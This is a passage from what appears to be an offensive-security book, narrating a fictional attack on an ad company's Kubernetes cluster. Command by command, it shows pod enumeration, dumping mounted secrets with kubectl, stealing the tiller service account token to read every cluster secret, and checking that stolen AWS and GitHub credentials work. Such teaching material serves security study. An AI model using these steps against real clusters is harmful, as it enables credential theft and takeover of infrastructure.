+<p>There is no reason to panic, though. Any random node usually hosts dozens, if not hundreds, of different pods at any given time, each with its own dirty secrets, volume data, and so on. Maybe at 11 <span class="KeyCaps">pm</span> today our node can only retrieve the password of a dummy database, but give it 30 minutes and the kube-scheduler may send the node a pod with cluster admin privileges. It’s all about being on the right node at the right moment. We list the pods running on the current machine to find out which secrets we are entitled to fetch:</p>
+
+<pre><code>shell&gt; <b>kubectl get pods --all-namespaces --field-selector\</b>
+<b>spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal</b>
+
+prod    ads-rtb-deployment-13fe-3evx   1/1  Running
+prod    ads-rtb-deployment-12dc-5css   1/1  Running
+prod    kafka-feeder-deployment-23ee   1/1  Running
+staging digital-elements-deploy-83ce   1/1  Running
+test    flask-deployment-5d76c-qb5tz   1/1  Running
+<var>--snip--</var></code></pre>
+
+<p>Lots of heterogeneous applications are hosted on this single node. That seems promising. The node will probably have access to a large number of secrets spanning various components. We use our custom parser to automatically list the secrets mounted by each pod:</p>
+
+<pre><code>shell&gt; .<b>/kubectl get pods -o="custom-columns=\</b>
+<b>NS:.metadata.namespace,\</b>
+<b>POD:.metadata.name,\</b>
+<b>ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\</b>
+<b>FILESECRET:.spec.volumes[*].secret.secretName" \</b>
+<b>--all-namespaces \</b>
+<b>--field-selector spec.nodeName=ip-192-168-21-116.eu-west-1.compute.internal</b>
+
+<span epub:type="pagebreak" title="149" id="Page_149"/>NS       POD             ENV                FILESECRET
+prod     kafka...        awsUserKafka       kafka-token-653ce
+prod     ads-rtb...      CassandraDB        default-token-c3de
+prod     ads-rtb...      CassandraDB        default-token-8dec
+staging  digital...      GithubBot          default-token-88ff
+test     flask...        AuroraDBTest       default-token-913d
+<var>--snip--</var></code></pre>
+
+<p>A treasure trove! Cassandra databases, AWS access keys, service accounts, Aurora database passwords, GitHub tokens, more AWS access keys . . . is this even real? We download (and decode) every secret with the rather explicit command <code>kubectl get secret</code>, as shown next:</p>
+
+<pre><code>shell&gt; <b>./kubectl get secret awsUserKafka  -o json -n prod \</b>
+<b>| jq .data</b>
+  "access_key_id": "AKIA44ZRK6WSSKDSKQDZ",
+  "secret_key_id": "93pLDv0FlQXnpyQSQvrMZ9ynbL9gdNkRUP1gO03S"
+
+shell&gt; <b>./kubectl get secret githubBot -o json -n staging\</b>
+<b>|jq .data</b>
+  "github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"
+
+shell&gt; <b>./kubectl get secret kafka-token-653ce -n prod -o json | jq -r .data.token</b>
+"ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZ...</code></pre>
+
+<p>Look at all these credentials and tokens we’re retrieving! And we’re not even done. Not by a long shot. See, this was just one node that happened to run the ads-rtb pod with the insecure Redis container. There are 200 other similar pods distributed over 700 machines that are vulnerable to the same cache poisoning technique.</p>
+<p>The formula for this kind of hack is simple: locate these pods (with the <code>get pods</code> command), connect to the Redis container, replace a few VAST URLs with the metadata API, collect the machine’s temporary AWS keys spilled to the audit database, convert them to a Kubernetes token, and retrieve the secrets loaded by the pods running on the node.</p>
+<p>We rinse and repeat, checking each node, and stop when we notice something very interesting in the output:</p>
+
+<pre><code>shell&gt; <b>./kubectl get pods -o="custom-columns=\</b>
+<b>NS:.metadata.namespace,\</b>
+<b>POD:.metadata.name,\</b>
+<b>ENV:.spec.containers[*].env[*].valueFrom.secretKeyRef,\</b>
+<b>FILESECRET:.spec.volumes[*].secret.secretName" \</b>
+<b>--all-namespaces \</b>
+<b>--field-selector spec.nodeName=ip-192-168-133-34.eu-west-1.compute.internal</b>
+
+NS              POD             ENV            FILESECRET
+<span class="CodeAnnotationHang" aria-label="annotation1">1</span> kube-system     tiller          &lt;none&gt;         tiller-token-3cea
+prod            ads-rtb...      CassandraDB    default-token-99ed</code></pre>
+
+<p><span epub:type="pagebreak" title="150" id="Page_150"/>We’ve come across lucky node number 192.168.133.34 <span class="CodeAnnotation" aria-label="annotation1">1</span>, which says it hosts a few pods belonging to the all-powerful <code>kube-system</code> namespace. There is almost a 90 percent likelihood that this tiller pod has cluster admin privileges. It plays a central role in <em>helm</em><em> v2</em>, the packet manager used to deploy and manage applications on Kubernetes. We impersonate this node and download tiller’s service account token:</p>
+
+<pre><code>root@Point1:~/# <b>aws eks update-kubeconfig --name prod-euw1 --profile node133</b>
+<var>--snip--</var>
+shell&gt; <b>./kubectl get secret tiller-token-3cea \</b>
+<b>-o json \</b>
+<b>--kubeconfig ./kube/config_133_34 \</b>
+<b>| jq -r .data.token</b>
+
+ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklpSjkuZXlKcGMzTWlPaU...</code></pre>
+
+<p>Armed with this powerful account, we can catch all secrets with one fat command. To hell with node authorization! We write the account token into a valid Kubectl config we name <em>tiller_config</em> and use it to query the cluster:</p>
+
+<pre><code>shell&gt; <b>kubectl get secrets \</b>
+<b>--all-namespaces \</b>
+<b>-o json \</b>
+<b>--kubeconfig ./kube/tiller_config</b>
+
+"abtest_db_user": "abtest-user-rw",
+"abtest_db_pass": "azg3Wk+swUFpNRW43Y0",
+"api_token": "dfb87c2be386dc11648d1fbf5e9c57d5",
+"ssh_metrics": "--- BEGIN SSH PRIVATE KEY --- ..."
+"github-bot-ro": "9c13d31aaedc0cc351dd12cc45ffafbe89848020"</code></pre>
+
+<p>From this, we get over 100 credentials spanning almost every database: Cassandra, MySQL, you name it. If it has something to do with the delivery of an ad, rest assured that we have a way to access it. We even recovered a few SSH private keys. We have no idea how to use them yet, but that should not take us too long to figure out.</p>
+<p>We also won a couple of valid AWS access keys, one of which belongs to a developer called Kevin Duncan. This will prove handy. We add them to our <em>credentials</em> file and perform a single API call to confirm they are indeed working:</p>
+
+<pre><code>root@Point1:~/# <b>vi ~/.aws/credentials</b>
+[kevin]
+aws_access_key_id = AKIA44ZRK6WSSKDSKQDZ
+aws_secret_access_key = 93pLDv0FlQXnpy+EplZsWmW/5r/+B/+KJ
+
+root@Point1:~/# <b>aws iam get-user --profile kevin</b>
+ "User": {
+    "Path": "/",
+    "UserName": "kevin.duncan",
+    "Arn": "arn:aws:iam::886371554408:user/kevin.duncan",</code></pre>
+
+<p><span epub:type="pagebreak" title="151" id="Page_151"/>And finally, we also make sure to grab that GitHub token belonging to <code>github-bot-ro</code>. We make sure it is still valid by performing a quick API call using these few lines of Python code:</p>
+
+<pre><code>root@Point1:~/# <b>python3 -m pip install PyGithub</b>
+root@Point1:~/# <b>python3</b>
+
+&gt;&gt;&gt; <b>from github import Github</b>
+&gt;&gt;&gt; <b>g = Github("9c13d31aaedc0cc351dd12cc45ffafbe89848020")</b>
+&gt;&gt;&gt; <b>print(g.get_user().name)</b>
+mxrads-bot-ro</code></pre>
+
+<p>They were right after all. Kubernetes sure is fun!</p>
+<p>We can safely say that we currently own MXR Ads’ delivery infrastructure. We still don’t know how the profile targeting works or who the end clients of Gretsch Politico are, but we can alter, delete, and block all their campaigns—and probably much more.</p>
+<p>Before we dive even deeper into this rabbit hole, we need to secure the position we worked so hard to attain. Containers have a high volatility that puts our current access at risk. All it would take is a new deployment of the surveys app to kill our shell access—and with it, our main entry point to MXR Ads’ Kubernetes cluster.</p>
+<h2 id="h1-501263c08-0005">Resources</h2>
+<ul>
+<li>More info about RBAC in Kubernetes: <a href="https://www.liquidweb.com/kb/kubernetes-rbac-authorization/" class="LinkURL">https://www.liquidweb.com/kb/kubernetes-rbac-authorization/</a>.</li>
+<li>John Lambert’s seminal piece on the defender’s mindset: <a href="https://github.com/JohnLaTwC/Shared" class="LinkURL">https://github.com/JohnLaTwC/Shared</a>.</li>
+<li>An intro to JSON Web Tokens: <a href="http://bit.ly/35JTJyp" class="LinkURL">http://bit.ly/35JTJyp</a>.</li>
+<li>The Kubernetes API reference: <a href="https://www.sparcflow.com/docs/kube-api-v1.19.html" class="LinkURL">https://www.sparcflow.com/docs/kube-api-v1.19.html</a>.</li>
+<li>A list of Kubectl commands: <a href="https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands" class="LinkURL">https://kubernetes.io/docs/reference/generated/kubectl/kubectl-commands</a>.</li>
+<li>Information on OpenID, an authentication standard used to delegate authentication to a third party: <a href="https://developers.onelogin.com/openid-connect/" class="LinkURL">https://developers.onelogin.com/openid-connect/</a>.</li>
+<li>IAM roles attached to pods: <a href="https://docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html" class="LinkURL">https://docs.aws.amazon.com/eks/latest/userguide/worker_node_IAM_role.html</a>.</li>
+<li>AWS docs on managing Auto Scaling groups for EKS: <a href="https://amzn.to/2uJeXQb" class="LinkURL">https://amzn.to/2uJeXQb</a>.</li>
+<li>An exploration of network policies in Kubernetes: <a href="https://banzaicloud.com/blog/network-policy/" class="LinkURL">https://banzaicloud.com/blog/network-policy/</a>.</li>
+<li>A walkthrough of installing Helm and Tiller on a Minikube cluster: <a href="http://bit.ly/2tgPBIQ" class="LinkURL">http://bit.ly/2tgPBIQ</a>.</li>
+<li>An explanation of real-time bidding: <a href="https://digiday.com/media/what-is-real-time-bidding/" class="LinkURL">https://digiday.com/media/what-is-real-time-bidding/</a>.</li>
+</ul>
+</section>
+</body></html>
